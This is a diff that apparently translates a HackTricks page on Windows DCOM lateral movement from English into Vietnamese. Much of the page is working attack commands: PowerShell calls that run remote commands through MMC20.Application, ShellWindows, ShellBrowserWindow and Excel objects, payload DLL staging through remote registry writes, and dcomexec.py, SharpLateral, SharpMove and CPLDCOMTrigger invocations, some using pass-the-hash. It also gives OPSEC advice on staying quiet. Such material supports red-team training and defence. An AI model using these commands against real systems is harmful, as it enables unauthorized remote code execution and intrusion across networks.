@@ -2,16 +2,16 @@
 
 {{#include ../../banners/hacktricks-training.md}}
 
-DCOM lateral movement is attractive because it reuses existing COM servers exposed over RPC/DCOM instead of creating a service or scheduled task. In practice this means the initial connection usually starts on TCP/135 and then moves to dynamically assigned high RPC ports.
+DCOM lateral movement hấp dẫn vì tái sử dụng các COM server hiện có được exposed qua RPC/DCOM thay vì tạo service hoặc scheduled task. Trên thực tế, điều này có nghĩa là kết nối ban đầu thường bắt đầu trên TCP/135 rồi chuyển sang các RPC port cao được gán động.
 
-## Prerequisites & Gotchas
+## Điều kiện tiên quyết & điểm cần lưu ý
 
-- You usually need a local administrator context on the target and the remote COM server must allow remote launch/activation.
-- Since **March 14, 2023**, Microsoft enforces DCOM hardening for supported systems. Old clients that request a low activation authentication level can fail unless they negotiate at least `RPC_C_AUTHN_LEVEL_PKT_INTEGRITY`. Modern Windows clients are usually auto-raised, so current tooling normally keeps working.<sup>[[3]](#references)</sup>
-- Manual or scripted DCOM execution generally needs TCP/135 plus the target's dynamic RPC port range. If you are using Impacket's `dcomexec.py` and you want command output back, you usually also need SMB access to `ADMIN$` (or another writable/readable share).
-- If RPC/DCOM works but SMB is blocked, `dcomexec.py -nooutput` can still be useful for blind execution.
+- Thông thường, bạn cần có quyền local administrator trên target và COM server từ xa phải cho phép remote launch/activation.
+- Kể từ **ngày 14 tháng 3 năm 2023**, Microsoft áp dụng cơ chế hardening DCOM cho các hệ thống được hỗ trợ. Các client cũ yêu cầu activation authentication level thấp có thể gặp lỗi, trừ khi chúng thương lượng được ít nhất `RPC_C_AUTHN_LEVEL_PKT_INTEGRITY`. Các Windows client hiện đại thường tự động nâng mức này, nên các công cụ hiện nay thường vẫn hoạt động.<sup>[[3]](#references)</sup>
+- Việc thực thi DCOM thủ công hoặc bằng script thường cần TCP/135 cùng với dynamic RPC port range của target. Nếu dùng Impacket's `dcomexec.py` và muốn nhận lại command output, bạn thường cũng cần quyền truy cập SMB vào `ADMIN$` (hoặc một share khác có thể đọc/ghi).
+- Nếu RPC/DCOM hoạt động nhưng SMB bị chặn, `dcomexec.py -nooutput` vẫn có thể hữu ích để thực thi lệnh mà không nhận output.
 
-Quick checks:
+Các kiểm tra nhanh:
 
 ```bash
 # Enumerate registered DCOM applications
@@ -23,32 +23,32 @@ Test-NetConnection -ComputerName 10.10.10.10 -Port 135
 
 ## MMC20.Application
 
-For more information about this technique, check the [original MMC20.Application post](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/).<sup>[[1]](#references)</sup>
+Để biết thêm thông tin về kỹ thuật này, hãy xem [bài viết gốc về MMC20.Application](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/).<sup>[[1]](#references)</sup>
 
-Distributed Component Object Model (DCOM) objects present an interesting capability for network-based interactions with objects. Microsoft provides comprehensive documentation for both DCOM and Component Object Model (COM), accessible [here for DCOM](https://msdn.microsoft.com/en-us/library/cc226801.aspx) and [here for COM](<https://msdn.microsoft.com/en-us/library/windows/desktop/ms694363(v=vs.85).aspx>). A list of DCOM applications can be retrieved using the PowerShell command:
+Các đối tượng Distributed Component Object Model (DCOM) có khả năng thú vị để tương tác với các đối tượng qua mạng. Microsoft cung cấp tài liệu toàn diện về cả DCOM và Component Object Model (COM), có thể truy cập [tại đây về DCOM](https://msdn.microsoft.com/en-us/library/cc226801.aspx) và [tại đây về COM](<https://msdn.microsoft.com/en-us/library/windows/desktop/ms694363(v=vs.85).aspx>). Có thể truy xuất danh sách các ứng dụng DCOM bằng lệnh PowerShell:
 
 ```bash
 Get-CimInstance Win32_DCOMApplication
 ```
 
-The COM object, [MMC Application Class (MMC20.Application)](https://technet.microsoft.com/en-us/library/cc181199.aspx), enables scripting of MMC snap-in operations. Notably, this object contains a `ExecuteShellCommand` method under `Document.ActiveView`. More information about this method can be found [here](<https://msdn.microsoft.com/en-us/library/aa815396(v=vs.85).aspx>). Check it running:<sup>[[6]](#references)</sup>
+Đối tượng COM [MMC Application Class (MMC20.Application)](https://technet.microsoft.com/en-us/library/cc181199.aspx) cho phép scripting các thao tác của MMC snap-in. Đáng chú ý, đối tượng này có phương thức `ExecuteShellCommand` trong `Document.ActiveView`. Bạn có thể tìm thêm thông tin về phương thức này [tại đây](<https://msdn.microsoft.com/en-us/library/aa815396(v=vs.85).aspx>). Kiểm tra khi chạy:<sup>[[6]](#references)</sup>
 
-This feature facilitates the execution of commands over a network through a DCOM application. To interact with DCOM remotely as an admin, PowerShell can be utilized as follows:
+Tính năng này cho phép thực thi lệnh qua mạng thông qua một ứng dụng DCOM. Để tương tác từ xa với DCOM bằng quyền admin, có thể sử dụng PowerShell như sau:
 
 ```bash
 [activator]::CreateInstance([type]::GetTypeFromProgID("<DCOM_ProgID>", "<IP_Address>"))
 ```
 
-This command connects to the DCOM application and returns an instance of the COM object. The ExecuteShellCommand method can then be invoked to execute a process on the remote host. The process involves the following steps:
+Lệnh này kết nối đến ứng dụng DCOM và trả về một instance của đối tượng COM. Sau đó, có thể gọi phương thức ExecuteShellCommand để thực thi một process trên máy chủ từ xa. Quy trình gồm các bước sau:
 
-Check methods:
+Kiểm tra các phương thức:
 
 ```bash
 $com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
 $com.Document.ActiveView | Get-Member
 ```
 
-Get RCE:
+Đạt RCE:
 
 ```bash
 $com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
@@ -60,23 +60,23 @@ $com.Document.ActiveView.ExecuteShellCommand(
 )
 ```
 
-The last argument is the window style. `7` keeps the window minimized. Operationally, MMC-based execution commonly leads to a remote `mmc.exe` process spawning your payload, which is different from the Explorer-backed objects below.
+Đối số cuối cùng là kiểu cửa sổ. `7` giữ cửa sổ ở trạng thái thu nhỏ. Trong thực tế, việc thực thi dựa trên MMC thường khiến tiến trình `mmc.exe` từ xa khởi chạy payload của bạn, khác với các đối tượng dựa trên Explorer bên dưới.
 
 ## ShellWindows & ShellBrowserWindow
 
-**For more info about this technique check the original post [https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)**<sup>[[2]](#references)</sup>
+**Để biết thêm thông tin về kỹ thuật này, hãy xem bài viết gốc [https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)**<sup>[[2]](#references)</sup>
 
-The **MMC20.Application** object was observed without an application-specific `LaunchPermission` value.<sup>[[2]](#references)</sup> This does not grant access by itself: COM checks the machine’s `DefaultLaunchPermission` ACL and machine-wide launch/access restrictions when applicable.<sup>[[9]](#references)[[10]](#references)</sup> For further details, a thread can be explored [here](https://twitter.com/tiraniddo/status/817532039771525120), and the usage of [@tiraniddo](https://twitter.com/tiraniddo)’s OleView .NET for filtering objects without explicit Launch Permission is recommended.
+Đối tượng **MMC20.Application** được ghi nhận là không có giá trị `LaunchPermission` dành riêng cho ứng dụng.<sup>[[2]](#references)</sup> Điều này không tự cấp quyền truy cập: COM kiểm tra ACL `DefaultLaunchPermission` của máy và các hạn chế khởi chạy/truy cập trên toàn máy khi áp dụng.<sup>[[9]](#references)[[10]](#references)</sup> Để biết thêm chi tiết, có thể tham khảo [luồng thảo luận này](https://twitter.com/tiraniddo/status/817532039771525120); đồng thời, nên dùng OleView .NET của [@tiraniddo](https://twitter.com/tiraniddo) để lọc các đối tượng không có Launch Permission được đặt tường minh.
 
-Two specific objects, `ShellBrowserWindow` and `ShellWindows`, were highlighted due to their lack of explicit Launch Permissions.<sup>[[2]](#references)</sup> An absent `LaunchPermission` value under `HKCR:\AppID\{guid}` means there is no application-specific launch ACL; it does **not** mean remote activation is unrestricted.<sup>[[9]](#references)[[10]](#references)</sup>
+Hai đối tượng cụ thể, `ShellBrowserWindow` và `ShellWindows`, được chú ý vì không có Launch Permissions được đặt tường minh.<sup>[[2]](#references)</sup> Việc không có giá trị `LaunchPermission` bên dưới `HKCR:\AppID\{guid}` có nghĩa là không có ACL khởi chạy dành riêng cho ứng dụng; điều này **không** có nghĩa là kích hoạt từ xa không bị hạn chế.<sup>[[9]](#references)[[10]](#references)</sup>
 
-Compared with `MMC20.Application`, these objects are often quieter from an OPSEC perspective because the command commonly ends up as a child of `explorer.exe` on the remote host instead of `mmc.exe`.
+So với `MMC20.Application`, các đối tượng này thường ít gây chú ý hơn về mặt OPSEC vì lệnh thường trở thành tiến trình con của `explorer.exe` trên máy chủ từ xa, thay vì `mmc.exe`.
 
 ### ShellWindows
 
-For `ShellWindows`, which lacks a ProgID, the .NET methods `Type.GetTypeFromCLSID` and `Activator.CreateInstance` facilitate object instantiation using its CLSID. This process leverages OleView .NET to retrieve the CLSID for `ShellWindows`. Once instantiated, interaction is possible through the `WindowsShell.Item` method, leading to method invocation like `Document.Application.ShellExecute`.<sup>[[2]](#references)</sup>
+Với `ShellWindows`, đối tượng không có ProgID, các phương thức .NET `Type.GetTypeFromCLSID` và `Activator.CreateInstance` cho phép khởi tạo đối tượng bằng CLSID của nó. Quá trình này dùng OleView .NET để lấy CLSID của `ShellWindows`. Sau khi khởi tạo, có thể tương tác thông qua phương thức `WindowsShell.Item`, dẫn đến việc gọi phương thức như `Document.Application.ShellExecute`.<sup>[[2]](#references)</sup>
 
-Example PowerShell commands were provided to instantiate the object and execute commands remotely:
+Các lệnh PowerShell ví dụ được cung cấp để khởi tạo đối tượng và thực thi lệnh từ xa:
 
 ```bash
 # Example
@@ -88,7 +88,7 @@ $item.Document.Application.ShellExecute("cmd.exe", "/c calc.exe", "c:\windows\sy
 
 ### ShellBrowserWindow
 
-`ShellBrowserWindow` is similar, but you can instantiate it directly via its CLSID and pivot to `Document.Application.ShellExecute`:
+`ShellBrowserWindow` tương tự, nhưng bạn có thể khởi tạo trực tiếp qua CLSID của nó và pivot sang `Document.Application.ShellExecute`:
 
 ```bash
 $com = [Type]::GetTypeFromCLSID("C08AFD90-F2A1-11D1-8455-00A0C91F3880", "10.10.10.10")
@@ -102,11 +102,11 @@ $obj.Document.Application.ShellExecute(
 )
 ```
 
-### Lateral Movement with Excel DCOM Objects
+### Di chuyển ngang với các đối tượng DCOM Excel
 
-Lateral movement can be achieved by exploiting DCOM Excel objects. For detailed information, it's advisable to read the discussion on leveraging Excel DDE for lateral movement via DCOM at [Cybereason's blog](https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom).<sup>[[5]](#references)</sup>
+Có thể thực hiện di chuyển ngang bằng cách khai thác các đối tượng DCOM Excel. Để biết thông tin chi tiết, bạn nên đọc bài viết về cách tận dụng Excel DDE để di chuyển ngang qua DCOM trên [blog của Cybereason](https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom).<sup>[[5]](#references)</sup>
 
-The Empire project provides a PowerShell script, which demonstrates the utilization of Excel for remote code execution (RCE) by manipulating DCOM objects. Below are snippets from the script available on [Empire's GitHub repository](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1), showcasing different methods to abuse Excel for RCE:
+Dự án Empire cung cấp một script PowerShell minh họa cách sử dụng Excel để thực thi mã từ xa (RCE) bằng cách thao túng các đối tượng DCOM. Dưới đây là các đoạn trích từ script có trên [kho GitHub của Empire](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1), minh họa các phương pháp khác nhau để khai thác Excel nhằm thực thi RCE:
 
 ```bash
 # Detection of Office version
@@ -131,15 +131,15 @@ elseif ($Method -Match "ExcelDDE") {
 }
 ```
 
-Recent research expanded this area with `Excel.Application`'s `ActivateMicrosoftApp()` method. The key idea is that Excel can try to launch legacy Microsoft applications such as FoxPro, Schedule Plus, or Project by searching the system `PATH`. If an operator can place a payload with one of those expected names in a writable location that is part of the target's `PATH`, Excel will execute it.<sup>[[4]](#references)</sup>
+Nghiên cứu gần đây đã mở rộng phạm vi này với phương thức `ActivateMicrosoftApp()` của `Excel.Application`. Ý tưởng chính là Excel có thể tìm cách khởi chạy các ứng dụng Microsoft cũ như FoxPro, Schedule Plus hoặc Project bằng cách tìm kiếm trong `PATH` của hệ thống. Nếu operator có thể đặt payload mang một trong những tên dự kiến đó vào một vị trí có quyền ghi nằm trong `PATH` của mục tiêu, Excel sẽ thực thi payload đó.<sup>[[4]](#references)</sup>
 
-Requirements for this variation:
+Yêu cầu đối với biến thể này:
 
-- Local admin on the target
-- Excel installed on the target
-- Ability to write a payload to a writable directory in the target's `PATH`
+- Quyền admin cục bộ trên mục tiêu
+- Excel được cài đặt trên mục tiêu
+- Có khả năng ghi payload vào một thư mục có quyền ghi trong `PATH` của mục tiêu
 
-Practical example abusing the FoxPro lookup (`FOXPROW.exe`):
+Ví dụ thực tế khai thác cơ chế tìm kiếm FoxPro (`FOXPROW.exe`):
 
 ```bash
 copy C:\Windows\System32\calc.exe \\192.168.52.100\c$\Users\victim\AppData\Local\Microsoft\WindowsApps\FOXPROW.exe
@@ -147,31 +147,31 @@ $com = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("Excel.Appli
 $com.ActivateMicrosoftApp("5")
 ```
 
-If the attacking host does not have the local `Excel.Application` ProgID registered, instantiate the remote object by CLSID instead:
+Nếu máy chủ tấn công không đăng ký ProgID cục bộ `Excel.Application`, hãy khởi tạo đối tượng từ xa bằng CLSID:
 
 ```bash
 $com = [System.Activator]::CreateInstance([type]::GetTypeFromCLSID("00020812-0000-0000-C000-000000000046", "192.168.52.100"))
 $com.Application.ActivateMicrosoftApp("5")
 ```
 
-Values seen abused in practice:
+Các giá trị đã được ghi nhận bị lạm dụng trong thực tế:
 
 - `5` -> `FOXPROW.exe`
 - `6` -> `WINPROJ.exe`
 - `7` -> `SCHDPLUS.exe`
 
-### COpenControlPanel — loading a registered Control Panel DLL
+### COpenControlPanel — tải một DLL Control Panel đã đăng ký
 
-The `COpenControlPanel` class (CLSID `{06622D85-6856-4460-8DE1-A81921B41C4B}`) exposes `IOpenControlPanel` (IID `{D11AD862-66DE-4DF4-BF6C-1F5621996AF1}`). Its `Open()` method causes Control Panel DLLs registered under the `Control Panel\Cpls` key to be loaded by a remote `dllhost.exe`. The class has no explicit launch/access permissions on tested systems, so it inherits the default DCOM policy (normally requiring an administrator for remote activation). A random item name is enough to make `Open()` process the registered DLLs; the payload does not need a `.cpl` extension, although it must be a valid DLL of the correct architecture.<sup>[[7]](#references)</sup>
+Lớp `COpenControlPanel` (CLSID `{06622D85-6856-4460-8DE1-A81921B41C4B}`) cung cấp `IOpenControlPanel` (IID `{D11AD862-66DE-4DF4-BF6C-1F5621996AF1}`). Phương thức `Open()` khiến các DLL Control Panel được đăng ký trong khóa `Control Panel\Cpls` được một `dllhost.exe` từ xa tải. Lớp này không có quyền khởi chạy/truy cập tường minh trên các hệ thống đã kiểm thử, vì vậy nó kế thừa chính sách DCOM mặc định (thường yêu cầu quyền quản trị viên để kích hoạt từ xa). Chỉ cần một tên mục bất kỳ là đủ để `Open()` xử lý các DLL đã đăng ký; payload không cần phần mở rộng `.cpl`, nhưng phải là DLL hợp lệ có kiến trúc phù hợp.<sup>[[7]](#references)</sup>
 
-This primitive is **stage-and-trigger**, not command-only execution: first copy a DLL to the target and create a `REG_EXPAND_SZ` value that points to it, then activate the object over DCOM. For example, from an administrative Windows context:<sup>[[7]](#references)</sup>
+Primitive này dùng cách **stage-and-trigger**, không phải thực thi chỉ bằng lệnh: trước tiên sao chép một DLL lên target và tạo một giá trị `REG_EXPAND_SZ` trỏ đến DLL đó, sau đó kích hoạt đối tượng qua DCOM. Ví dụ, từ ngữ cảnh Windows có quyền quản trị:<sup>[[7]](#references)</sup>
 
 ```cmd
 copy payload.dll \\target\C$\Windows\Temp\panel.dll
 reg.exe add "\\target\HKLM\Software\Microsoft\Windows\CurrentVersion\Control Panel\Cpls" /v Updater /t REG_EXPAND_SZ /d "C:\Windows\Temp\panel.dll" /f
 ```
 
-The public [CPLDCOMTrigger](https://github.com/klsecservices/CPLDCOMTrigger) client implements the undocumented DCOM call with Impacket. Supplying an arbitrary Control Panel item name is sufficient; the client can report an RPC error even though `dllhost.exe` loaded the DLL.<sup>[[8]](#references)</sup>
+Client [CPLDCOMTrigger](https://github.com/klsecservices/CPLDCOMTrigger) công khai triển khai lệnh gọi DCOM không được tài liệu hóa bằng Impacket. Chỉ cần cung cấp tên Control Panel item bất kỳ; client vẫn có thể báo lỗi RPC dù `dllhost.exe` đã tải DLL.<sup>[[8]](#references)</sup>
 
 ```bash
 git clone https://github.com/klsecservices/CPLDCOMTrigger
@@ -183,20 +183,20 @@ python3 CPLTrig.py 'DOMAIN/user@target' -hashes ':NTHASH' -cpl random
 python3 CPLTrig.py 'DOMAIN/user@target.domain.local' -aesKey AES_KEY_HEX -dc-ip 10.10.10.10 -cpl random
 ```
 
-Operationally, this path also needs a file-write channel and remote registry access, so it is noisier than `MMC20`/`ShellWindows`. It creates a persistence side effect because opening Control Panel later can load the same entry again. Remove the value after execution and hunt for unexpected `Control Panel\Cpls` values together with unusual DLL loads in `dllhost.exe`.<sup>[[7]](#references)</sup>
+Về mặt vận hành, phương thức này cũng cần một kênh ghi tệp và quyền truy cập registry từ xa, nên dễ bị phát hiện hơn `MMC20`/`ShellWindows`. Nó tạo ra một tác dụng phụ duy trì quyền truy cập, vì lần sau mở Control Panel có thể tải lại mục đó. Hãy xóa giá trị sau khi thực thi và tìm các giá trị bất thường trong `Control Panel\Cpls`, đồng thời kiểm tra các DLL được tải bất thường trong `dllhost.exe`.<sup>[[7]](#references)</sup>
 
 ```cmd
 reg.exe delete "\\target\HKLM\Software\Microsoft\Windows\CurrentVersion\Control Panel\Cpls" /v Updater /f
 del \\target\C$\Windows\Temp\panel.dll
 ```
 
-### Automation Tools for Lateral Movement
+### Công cụ tự động hóa cho Lateral Movement
 
-Two tools are highlighted for automating these techniques:
+Hai công cụ được nêu bật để tự động hóa các kỹ thuật này:
 
-- **Invoke-DCOM.ps1**: A PowerShell script provided by the Empire project that simplifies the invocation of different methods for executing code on remote machines. This script is accessible at the Empire GitHub repository.
+- **Invoke-DCOM.ps1**: Script PowerShell do dự án Empire cung cấp, giúp đơn giản hóa việc gọi các phương thức khác nhau để thực thi code trên các máy từ xa. Script này có trong repository GitHub của Empire.
 
-- **SharpLateral**: A tool designed for executing code remotely, which can be used with the command:
+- **SharpLateral**: Công cụ được thiết kế để thực thi code từ xa, có thể sử dụng với lệnh:
 
 ```bash
 SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
@@ -208,10 +208,10 @@ SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
 SharpMove.exe action=dcom computername=remote.host.local command="C:\windows\temp\payload.exe\" method=ShellBrowserWindow amsi=true
 ```
 
-## Automatic Tools
+## Công cụ tự động
 
-- The Powershell script [**Invoke-DCOM.ps1**](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1) allows to easily invoke all the commented ways to execute code in other machines.
-- You can use Impacket's `dcomexec.py` to execute commands on remote systems using DCOM. Current builds support `ShellWindows`, `ShellBrowserWindow`, and `MMC20`, and default to `ShellWindows`.
+- Script Powershell [**Invoke-DCOM.ps1**](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1) cho phép dễ dàng gọi tất cả các cách đã được chú thích để thực thi code trên các máy khác.
+- Bạn có thể dùng `dcomexec.py` của Impacket để thực thi lệnh trên các hệ thống từ xa bằng DCOM. Các bản build hiện tại hỗ trợ `ShellWindows`, `ShellBrowserWindow` và `MMC20`, đồng thời mặc định dùng `ShellWindows`.
 
 ```bash
 dcomexec.py 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c whoami"
@@ -223,13 +223,13 @@ dcomexec.py -object MMC20 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c who
 dcomexec.py -object ShellBrowserWindow -nooutput 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c calc.exe"
 ```
 
-- You could also use [**SharpLateral**](https://github.com/mertdas/SharpLateral):
+- Bạn cũng có thể sử dụng [**SharpLateral**](https://github.com/mertdas/SharpLateral):
 
 ```bash
 SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
 ```
 
-- You could also use [**SharpMove**](https://github.com/0xthirteen/SharpMove)
+- Bạn cũng có thể sử dụng [**SharpMove**](https://github.com/0xthirteen/SharpMove)
 
 ```bash
 SharpMove.exe action=dcom computername=remote.host.local command="C:\windows\temp\payload.exe\" method=ShellBrowserWindow amsi=true
@@ -241,14 +241,14 @@ SharpMove.exe action=dcom computername=remote.host.local command="C:\windows\tem
 
 ## References
 
-- [1] [Lateral Movement using the MMC20.Application COM Object](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)
-- [2] [Lateral Movement via DCOM: Round 2](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)
-- [3] [KB5004442—Manage changes for Windows DCOM Server Security Feature Bypass (CVE-2021-26414)](https://support.microsoft.com/en-us/topic/kb5004442-manage-changes-for-windows-dcom-server-security-feature-bypass-cve-2021-26414-f1400b52-c141-43d2-941e-37ed901c769c)
-- [4] [Lateral Movement: Abuse the Power of DCOM Excel Application](https://specterops.io/blog/2023/10/30/lateral-movement-abuse-the-power-of-dcom-excel-application/)
-- [5] [Leveraging Excel DDE for lateral movement via DCOM](https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom)
-- [6] [technet.microsoft.com - MMC Application Class (MMC20.Application)](https://technet.microsoft.com/en-us/library/cc181199.aspx)
-- [7] [Using DCOM objects for remote command execution](https://securelist.com/lateral-movement-via-dcom-abusing-control-panel/118232/)
+- [1] [Di chuyển ngang bằng đối tượng COM MMC20.Application](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)
+- [2] [Di chuyển ngang qua DCOM: Vòng 2](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)
+- [3] [KB5004442—Quản lý các thay đổi đối với lỗ hổng bỏ qua tính năng bảo mật Windows DCOM (CVE-2021-26414)](https://support.microsoft.com/en-us/topic/kb5004442-manage-changes-for-windows-dcom-server-security-feature-bypass-cve-2021-26414-f1400b52-c141-43d2-941e-37ed901c769c)
+- [4] [Di chuyển ngang: Khai thác sức mạnh của DCOM Excel Application](https://specterops.io/blog/2023/10/30/lateral-movement-abuse-the-power-of-dcom-excel-application/)
+- [5] [Tận dụng Excel DDE để di chuyển ngang qua DCOM](https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom)
+- [6] [technet.microsoft.com - Lớp MMC Application (MMC20.Application)](https://technet.microsoft.com/en-us/library/cc181199.aspx)
+- [7] [Sử dụng đối tượng DCOM để thực thi lệnh từ xa](https://securelist.com/lateral-movement-via-dcom-abusing-control-panel/118232/)
 - [8] [CPLDCOMTrigger](https://github.com/klsecservices/CPLDCOMTrigger)
 - [9] [DefaultLaunchPermission - Microsoft Learn](https://learn.microsoft.com/en-us/windows/win32/com/defaultlaunchpermission)
-- [10] [MS-DCOM: Appendix B, Product Behavior - Microsoft Learn](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-dcom/acc42954-4073-4f05-b850-efd562022077)
+- [10] [MS-DCOM: Phụ lục B, Hành vi sản phẩm - Microsoft Learn](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-dcom/acc42954-4073-4f05-b850-efd562022077)
 {{#include ../../banners/hacktricks-training.md}}
